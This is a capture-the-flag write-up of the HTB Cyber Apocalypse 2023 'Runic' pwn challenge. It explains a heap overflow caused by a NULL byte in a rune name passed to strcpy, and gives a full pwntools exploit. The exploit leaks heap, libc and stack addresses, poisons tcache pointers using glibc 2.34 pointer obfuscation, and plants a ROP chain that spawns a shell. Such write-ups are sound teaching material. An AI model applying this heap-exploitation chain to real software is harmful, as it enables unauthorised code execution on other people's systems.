# Runic - HTB Cyber Apocalypse 2023

## Description
Pandora is close to finally arriving at the Pharaoh's tomb and finding the ancient relic, but she faces a tremendously complex challenge. She stumbles upon a alien-looking piece of technology that has never been mentioned in her archives, and it seems to be blocking the entrance to the Pharaoh's tomb. The machine has some runes inscribed on its surface, but Pandora can't work their meaning out. The only thing she knows is that they seem to appear, change and disappear when she tries to manipulate them. She really can't figure out the inner workings of the device, but she can't just give up. Can you help Pandora master the runes?

## Solution
Checksec:
```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
RUNPATH:  b'.'
```

libc version this time is libc.2-34.so. Which means heap pointer mangling is present.

The binary implements a hash table which it stores our runes in.

The hash table is just an array containing pointers to items which is called MainTable.

The items in the hash tables have the following structure:

```C
struct item_t {
    char name[8];
    char* chunk;
    size_t data_len;
};
```

The problem lies in the edit function:

```C
{
  long lVar1;
  char *__dest;
  item_t *piVar2;
  uint curr_hash;
  long in_FS_OFFSET;
  char old_rune_name [8];
  char new_rune_name [8];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  old_rune_name = (char  [8])0x0;
  new_rune_name = (char  [8])0x0;
  puts("Rune name: ");
  read(0,old_rune_name,8);
  curr_hash = hash(old_rune_name);
  __dest = MainTable[curr_hash]->chunk;
  if (__dest == (char *)0x0) {
    puts("There\'s no rune with that name!");
  }
  else {
    puts("New name: ");
    read(0,new_rune_name,8);
    curr_hash = hash(new_rune_name);
    if (MainTable[curr_hash]->chunk == (char *)0x0) {
      curr_hash = hash(new_rune_name);
      strcpy(MainTable[curr_hash]->name,new_rune_name);
      curr_hash = hash(old_rune_name);
      piVar2 = MainTable[curr_hash];
      curr_hash = hash(new_rune_name);
      memcpy(&MainTable[curr_hash]->chunk,&piVar2->chunk,0xc);
      //Bug Here
      strcpy(__dest,new_rune_name);
      curr_hash = hash(old_rune_name);
      memset(MainTable[curr_hash],0,0x14);
      puts("Rune contents: ");
      curr_hash = hash(__dest);
      read(0,__dest + 8,(ulong)*(uint *)&MainTable[curr_hash]->data_len);
    }
    else {
      puts("That rune name is already in use!");
    }
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

It copies the new_rune_name into dest expecting that rune_name to be a NULL terminated string.

However we can provide a new rune name which has a NULL byte in it, and it will take the length from that rune instead and read that into dest.

Eg.
```
defs:
create(rune_name,length,contents)
edit(rune_name,new_rune_name,contents)

create("1",0x10,somecontent)
create("2",0x50,somecontent)
edit("1","2\x002", malcontent)
```

This will cause an overflow from chunk 1 into chunk 2.

This can be abused for getting full code execution.

To leak a heap pointer do the following:

1. Create 4 chunks. 3 of size 0x10 and one of size 0x58
2. Delete chunk 3
3. Edit chunk 1 with the new name 4\x004. And write data untill you hit the freed heap pointer
4. Show chunk 1 or chunk 2.

Since there is heap pointer mangling but it's the first chunk allocated. The heap base can be found by bitshifting the leaked pointer to the left by 12 (eg. heap_leak << 12)

Next we need a libc pointer. We can use the same method of overwriting to overwrite a chunk size to be 0x421. Then free that pointer to get a libc pointer. Then overflow untill we hit the libc pointer to leak again.

Once leaking is done, we can just overflow into the free pointers of the tcache bins. But since this is libc 2.34 no free hook is available (I think). So we'll instead leak the stack as well.

To leak the stack, we use the overflow again to overwrite a free pointer to point at __libc_argv. We need to remember to obfuscate the pointer we are writing as this is libc-2.34.

Obfuscation can be done as follows:
```py
def obfuscate(pos,ptr):
    return (pos>>12) ^ ptr
```

Next we allocate that chunk and fill it with data untill we hit the stack pointer. Then show that chunk.

Once we have a stack leak, we just need to allocate a chunk on top of the return pointer for create, with a ROP chain. Again this is done by overflowing into a free pointer, and then allocating that free pointer.

In short we:
1. Use overflow to write up to heap free ptr and leak it. Then deobfuscate it
2. Use overflow to overwrite size of a chunk, then free it to get a libc pointer. Leak by using the same method as in 1
3. Use overflow to allocate a chunk on top of __libc_argv. Fill it with data untill we can leak the pointer
4. Use overflow to allocate a chunk on top of the create functions return pointer, to allocate a ROP chain and spawn shell


Exploit:

```py
from pwn import *

gdbscript = """
c
"""
#io = gdb.debug("./runic",gdbscript=gdbscript)
#io = process("./runic")
io = remote("165.227.224.40",32085)

def create(name,size,data):
    io.recvuntil(b'Action:')
    io.sendline(b'1')
    io.recvuntil(b'Rune name:')
    io.send(name)
    io.recvuntil(b'Rune length')
    io.send(f"{size}".encode())
    io.recvuntil(b'Rune contents:')
    io.send(data)

def delete(name):
    io.recvuntil(b'Action:')
    io.sendline(b'2')
    io.recvuntil(b'Rune name:')
    io.send(name)

def show_rune(name):
    io.recvuntil(b'Action:')
    io.sendline(b'4')
    io.recvuntil(b'Rune name:')
    io.send(name)
    io.recvuntil(b'Rune contents:\n\n')
    return io.recvline()

def edit(name,newname,data):
    io.recvuntil(b'Action:')
    io.sendline(b'3')
    io.recvuntil(b'Rune name:')
    io.send(name)
    io.recvuntil(b'New name:')
    io.send(newname)
    io.recvuntil(b'Rune contents:')
    io.send(data)

def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val
def obfuscate(pos,ptr):
    return (pos>>12) ^ ptr

#Chunks to create unsorted bin and heap leak
create(b'1',0x10,b'B'*0x10)
create(b'2',0x10,b'C'*0x10)
create(b'4',0x10,b'E'*0x10)
create(b'3',0x58,b'D'*0x58)

#These chunks are to make sure we can free into unsorted bin
create(b'5',0x58,b'G'*0x58)
create(b'6',0x58,b'G'*0x58)
create(b'7',0x58,b'G'*0x58)
create(b'8',0x58,b'G'*0x58)
create(b'9',0x58,b'G'*0x58)
create(b'A',0x58,b'G'*0x58)
create(b'B',0x58,b'G'*0x58)
create(b'C',0x48,b'G'*0x18)
create(b'D',0x10,b'H'*0x10)

#These are to create stack leak
create(b'E',0x10,b'H'*0x10)
create(b'F',0x10,b'H'*0x10)
create(b'G',0x10,b'H'*0x10)

#These are to allocate inside libc
create(b'K',0x20,b'I'*0x20)
create(b'H',0x20,b'I'*0x20)
create(b'I',0x20,b'I'*0x20)
create(b'J',0x20,b'I'*0x20)

#First get heap leak
delete(b'4')
edit(b'1',b'3\x003',b'A'*0x38)
leak = u64(show_rune(b'2').split(b'A'*0x18)[1][:-1].ljust(8,b'\x00'))
heap_base = leak << 12


log.info(f"Heap base: {heap_base:#x}")

#Restore the first chunk to original name. This is just so we can reuse it
edit(b'3\x003',b'1',b'a')
edit(b'1',b'3\x003',b'A'*0x10+p64(0x21) + b'A'*0x18 + p64(0x21))
edit(b'3\x003',b'1',b'a')

#Re-allocate it
create(b'4',0x10,b'E'*0x10)
#Overflow the size of chunk 4 so it becomes 0x421 big
edit(b'1',b'3\x003',b'A'*0x10 + p64(0x21) + b'A'*0x18 + p64(0x421))
#Free chunk 4
delete(b'4')

#Restore the first chunk to original name
edit(b'3\x003',b'1',b'a')
#Overflow up to the libc ptr in chunk 4 to leak
edit(b'1',b'3\x003',b'A'*0x38)
libc_leak = u64(show_rune(b'2').split(b'A'*0x18)[1][:-1].ljust(8,b'\x00'))
libc_base = libc_leak - 0x1f2cc0
log.info(f"LIBC BASE: {libc_base:#x}")


libc_argv = libc_base+0x1f46e0
over_write_val = obfuscate(heap_base,libc_argv-0x10)

#Overwrite free ptr with __libc_argv address
delete(b'E')
delete(b'F')
delete(b'G')

edit(b'D',b'5\x005',b'A'*0x10+p64(0x21)+b'A'*0x20 + p64(over_write_val))

create(b'E',0x10,b'H'*0x10)
create(b'F',0x10,b'H'*0x10)
create(b'G',0x10,b'A'*8)

#Leak stack
stack_leak = u64(show_rune(b'G')[8:-1].ljust(8,b'\x00'))
log.info(f"STACK LEAK: {stack_leak:#x}")

edit(b'5\x005',b'D',b'a')

#Overwrite free pointer with return pointer address of edit
delete(b'I')
delete(b'H')
delete(b'J')

ret_ptr = stack_leak-0x148
edit(b'K',b'5\x005',b'A'*0x28 + p64(obfuscate(heap_base,ret_ptr)))
create(b'L',0x20,b'a')
create(b'M',0x20,b'b')

#Allocate a ROP chain.
poprdi = p64(libc_base+0x000000000002daa2)
binsh = p64(libc_base+0x001b4689)
system = p64(libc_base+0x4e320)

create(b'N',0x20,poprdi+binsh+system)

io.interactive()
```

## Flag
`HTB{k1ng_0f_h4sh1n_4nd_m4st3r_0f_th3_run3s}`

